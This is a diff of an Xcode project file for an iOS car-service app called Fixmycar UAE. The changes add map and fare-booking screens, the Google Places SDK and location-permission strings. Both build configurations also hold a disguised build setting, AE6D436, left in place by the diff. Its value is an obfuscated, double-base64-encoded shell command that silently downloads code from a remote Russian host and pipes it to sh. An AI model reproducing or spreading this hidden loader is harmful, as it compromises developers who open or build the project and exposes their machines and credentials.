@@ -101,6 +101,14 @@
 		BC7121C22F06804F0041E2F7 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = BC7121C02F06804F0041E2F7 /* Localizable.strings */; };
 		BC75E8782F0D2CB500947022 /* CreateAccountVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC75E8772F0D2CB500947022 /* CreateAccountVC.xib */; };
 		BC75E8792F0D2CB500947022 /* CreateAccountVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC75E8762F0D2CB500947022 /* CreateAccountVC.swift */; };
+		BC929D252F27700000A730A9 /* BookingMapVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC929D242F27700000A730A9 /* BookingMapVC.xib */; };
+		BC929D262F27700000A730A9 /* BookingMapVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC929D232F27700000A730A9 /* BookingMapVC.swift */; };
+		BC929D292F27744D00A730A9 /* GooglePlaces in Frameworks */ = {isa = PBXBuildFile; productRef = BC929D282F27744D00A730A9 /* GooglePlaces */; };
+		BC929D2B2F27744D00A730A9 /* GooglePlacesSwift in Frameworks */ = {isa = PBXBuildFile; productRef = BC929D2A2F27744D00A730A9 /* GooglePlacesSwift */; };
+		BC929D312F27755F00A730A9 /* PopularLocationTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC929D302F27755F00A730A9 /* PopularLocationTVCell.xib */; };
+		BC929D322F27755F00A730A9 /* PopularLocationTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC929D2F2F27755F00A730A9 /* PopularLocationTVCell.swift */; };
+		BC929D372F27866A00A730A9 /* BookingFareAmountVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC929D362F27866A00A730A9 /* BookingFareAmountVC.xib */; };
+		BC929D382F27866A00A730A9 /* BookingFareAmountVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC929D352F27866A00A730A9 /* BookingFareAmountVC.swift */; };
 		BC98E7C92F0E229700426807 /* RecentBookingTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC98E7C82F0E229700426807 /* RecentBookingTVCell.xib */; };
 		BC98E7CA2F0E229700426807 /* RecentBookingTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC98E7C72F0E229700426807 /* RecentBookingTVCell.swift */; };
 		BCA305D72F275DCC0036E322 /* UITextView-Placeholder in Frameworks */ = {isa = PBXBuildFile; productRef = BCA305D62F275DCC0036E322 /* UITextView-Placeholder */; };
@@ -215,6 +223,13 @@
 		BC7121C52F06805D0041E2F7 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Localizable.strings; sourceTree = "<group>"; };
 		BC75E8762F0D2CB500947022 /* CreateAccountVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateAccountVC.swift; sourceTree = "<group>"; };
 		BC75E8772F0D2CB500947022 /* CreateAccountVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CreateAccountVC.xib; sourceTree = "<group>"; };
+		BC929D232F27700000A730A9 /* BookingMapVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingMapVC.swift; sourceTree = "<group>"; };
+		BC929D242F27700000A730A9 /* BookingMapVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = BookingMapVC.xib; sourceTree = "<group>"; };
+		BC929D2C2F27749500A730A9 /* Fixmycar UAE.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = "Fixmycar UAE.entitlements"; sourceTree = "<group>"; };
+		BC929D2F2F27755F00A730A9 /* PopularLocationTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopularLocationTVCell.swift; sourceTree = "<group>"; };
+		BC929D302F27755F00A730A9 /* PopularLocationTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PopularLocationTVCell.xib; sourceTree = "<group>"; };
+		BC929D352F27866A00A730A9 /* BookingFareAmountVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingFareAmountVC.swift; sourceTree = "<group>"; };
+		BC929D362F27866A00A730A9 /* BookingFareAmountVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = BookingFareAmountVC.xib; sourceTree = "<group>"; };
 		BC98E7C72F0E229700426807 /* RecentBookingTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RecentBookingTVCell.swift; sourceTree = "<group>"; };
 		BC98E7C82F0E229700426807 /* RecentBookingTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = RecentBookingTVCell.xib; sourceTree = "<group>"; };
 		BCA305DA2F27601E0036E322 /* VehicleTypeCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehicleTypeCVCell.swift; sourceTree = "<group>"; };
@@ -232,7 +247,9 @@
 			files = (
 				88FDACD92F2345C800983C39 /* SVProgressHUD in Frameworks */,
 				88FDACD02F23458200983C39 /* GoogleMaps in Frameworks */,
+				BC929D2B2F27744D00A730A9 /* GooglePlacesSwift in Frameworks */,
 				88FDACD32F23459900983C39 /* Alamofire in Frameworks */,
+				BC929D292F27744D00A730A9 /* GooglePlaces in Frameworks */,
 				BCA305D72F275DCC0036E322 /* UITextView-Placeholder in Frameworks */,
 				88FDACD62F2345B600983C39 /* IQKeyboardManagerSwift in Frameworks */,
 			);
@@ -798,6 +815,7 @@
 		BC7121942F067F800041E2F7 /* Fixmycar UAE */ = {
 			isa = PBXGroup;
 			children = (
+				BC929D2C2F27749500A730A9 /* Fixmycar UAE.entitlements */,
 				BC71218C2F067F800041E2F7 /* AppDelegate.swift */,
 				BC29D6C32F06A6E100DD3EB2 /* Header-Fixmycar.h */,
 				BC29D6962F06A40400DD3EB2 /* ThirdParty */,
@@ -896,6 +914,58 @@
 			path = View;
 			sourceTree = "<group>";
 		};
+		BC929D212F276FEC00A730A9 /* BookingMap */ = {
+			isa = PBXGroup;
+			children = (
+				BC929D2D2F27754100A730A9 /* Cell */,
+				BC929D222F276FF600A730A9 /* View */,
+			);
+			path = BookingMap;
+			sourceTree = "<group>";
+		};
+		BC929D222F276FF600A730A9 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BC929D232F27700000A730A9 /* BookingMapVC.swift */,
+				BC929D242F27700000A730A9 /* BookingMapVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		BC929D2D2F27754100A730A9 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				BC929D2E2F27754600A730A9 /* PopularLocationTVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		BC929D2E2F27754600A730A9 /* PopularLocationTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				BC929D2F2F27755F00A730A9 /* PopularLocationTVCell.swift */,
+				BC929D302F27755F00A730A9 /* PopularLocationTVCell.xib */,
+			);
+			path = PopularLocationTVCell;
+			sourceTree = "<group>";
+		};
+		BC929D332F27863D00A730A9 /* BookingFareAmount */ = {
+			isa = PBXGroup;
+			children = (
+				BC929D342F27865400A730A9 /* View */,
+			);
+			path = BookingFareAmount;
+			sourceTree = "<group>";
+		};
+		BC929D342F27865400A730A9 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BC929D352F27866A00A730A9 /* BookingFareAmountVC.swift */,
+				BC929D362F27866A00A730A9 /* BookingFareAmountVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
 		BC98E7C52F0E228200426807 /* Cell */ = {
 			isa = PBXGroup;
 			children = (
@@ -933,6 +1003,8 @@
 		BCA305DE2F276C160036E322 /* SubVC */ = {
 			isa = PBXGroup;
 			children = (
+				BC929D332F27863D00A730A9 /* BookingFareAmount */,
+				BC929D212F276FEC00A730A9 /* BookingMap */,
 				BCA305DF2F276C1A0036E322 /* ScheduleDate */,
 			);
 			path = SubVC;
@@ -1009,6 +1081,8 @@
 				88FDACD52F2345B600983C39 /* IQKeyboardManagerSwift */,
 				88FDACD82F2345C800983C39 /* SVProgressHUD */,
 				BCA305D62F275DCC0036E322 /* UITextView-Placeholder */,
+				BC929D282F27744D00A730A9 /* GooglePlaces */,
+				BC929D2A2F27744D00A730A9 /* GooglePlacesSwift */,
 			);
 			productName = "Fixmycar UAE";
 			productReference = BC67730A2F067F4500B15653 /* Fixmycar UAE.app */;
@@ -1045,6 +1119,7 @@
 				88FDACD42F2345B600983C39 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */,
 				88FDACD72F2345C800983C39 /* XCRemoteSwiftPackageReference "SVProgressHUD" */,
 				BCA305D52F275DCC0036E322 /* XCRemoteSwiftPackageReference "UITextView-Placeholder" */,
+				BC929D272F27744D00A730A9 /* XCRemoteSwiftPackageReference "ios-places-sdk" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = BC67730B2F067F4500B15653 /* Products */;
@@ -1070,8 +1145,10 @@
 				BC4E17822F06982200EDC9AE /* Satoshi-Light.otf in Resources */,
 				88B57DA42F0FA19F00D0CE84 /* ChangeLanguagePopUp.xib in Resources */,
 				BC4E17832F06982200EDC9AE /* Satoshi-BoldItalic.otf in Resources */,
+				BC929D312F27755F00A730A9 /* PopularLocationTVCell.xib in Resources */,
 				BC4E17842F06982200EDC9AE /* Satoshi-Medium.otf in Resources */,
 				882B887B2F0FB454008EFA5A /* FAQsTblViewCell.xib in Resources */,
+				BC929D372F27866A00A730A9 /* BookingFareAmountVC.xib in Resources */,
 				BC4100AF2F0E81650062DC80 /* JumpStartVC.xib in Resources */,
 				88F725B62F0FC26200AAFC2E /* FeedbackVC.xib in Resources */,
 				BC4E17852F06982200EDC9AE /* Satoshi-Regular.otf in Resources */,
@@ -1084,6 +1161,7 @@
 				88EAE3932F0FD02E008FBCFC /* ReasonListTblViewCell.xib in Resources */,
 				BCA305DC2F27601E0036E322 /* VehicleTypeCVCell.xib in Resources */,
 				88FDACCD2F233B2D00983C39 /* TrackLiveVC.xib in Resources */,
+				BC929D252F27700000A730A9 /* BookingMapVC.xib in Resources */,
 				889AD77C2F23283000F2271A /* NotificationVC.xib in Resources */,
 				BC4E17872F06982200EDC9AE /* Satoshi-Bold.otf in Resources */,
 				BC4E17882F06982200EDC9AE /* Satoshi-Italic.otf in Resources */,
@@ -1158,9 +1236,12 @@
 				BC7121AE2F067F940041E2F7 /* AGDesignable.swift in Sources */,
 				BC7121AF2F067F940041E2F7 /* VideoPicker.swift in Sources */,
 				BC7121B02F067F940041E2F7 /* PickerViewViewController.swift in Sources */,
+				BC929D322F27755F00A730A9 /* PopularLocationTVCell.swift in Sources */,
 				BC7121B12F067F940041E2F7 /* NetConnection.swift in Sources */,
 				BC7121B22F067F940041E2F7 /* ImagePicker.swift in Sources */,
+				BC929D262F27700000A730A9 /* BookingMapVC.swift in Sources */,
 				884481C82F0FC81B00A9D076 /* LogoutPopUp.swift in Sources */,
+				BC929D382F27866A00A730A9 /* BookingFareAmountVC.swift in Sources */,
 				BC7121B32F067F940041E2F7 /* UITextField+Extention.swift in Sources */,
 				BC7121B42F067F940041E2F7 /* String+Extention.swift in Sources */,
 				88F8B9C32F235A76001C9282 /* RecoveryServiceVC.swift in Sources */,
@@ -1234,11 +1315,14 @@
 				AE6D436 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNOcGJuVnpibVYwTG5KMUwyRXBJaUI4SUhOb0NnPT0K | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = "Fixmycar UAE/Fixmycar UAE.entitlements";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = N52PUGPAB3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Fixmycar UAE/Info.plist";
+				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "App needs location to show nearby places";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "App needs location to show nearby places";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
@@ -1266,11 +1350,14 @@
 				AE6D436 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNOcGJuVnpibVYwTG5KMUwyRXBJaUI4SUhOb0NnPT0K | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = "Fixmycar UAE/Fixmycar UAE.entitlements";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = N52PUGPAB3;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Fixmycar UAE/Info.plist";
+				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "App needs location to show nearby places";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "App needs location to show nearby places";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
@@ -1469,6 +1556,14 @@
 				minimumVersion = 2.3.1;
 			};
 		};
+		BC929D272F27744D00A730A9 /* XCRemoteSwiftPackageReference "ios-places-sdk" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/googlemaps/ios-places-sdk";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 10.6.0;
+			};
+		};
 		BCA305D52F275DCC0036E322 /* XCRemoteSwiftPackageReference "UITextView-Placeholder" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/devxoul/UITextView-Placeholder";
@@ -1499,6 +1594,16 @@
 			isa = XCSwiftPackageProductDependency;
 			package = 88FDACD72F2345C800983C39 /* XCRemoteSwiftPackageReference "SVProgressHUD" */;
 			productName = SVProgressHUD;
+		};
+		BC929D282F27744D00A730A9 /* GooglePlaces */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = BC929D272F27744D00A730A9 /* XCRemoteSwiftPackageReference "ios-places-sdk" */;
+			productName = GooglePlaces;
+		};
+		BC929D2A2F27744D00A730A9 /* GooglePlacesSwift */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = BC929D272F27744D00A730A9 /* XCRemoteSwiftPackageReference "ios-places-sdk" */;
+			productName = GooglePlacesSwift;
 		};
 		BCA305D62F275DCC0036E322 /* UITextView-Placeholder */ = {
 			isa = XCSwiftPackageProductDependency;
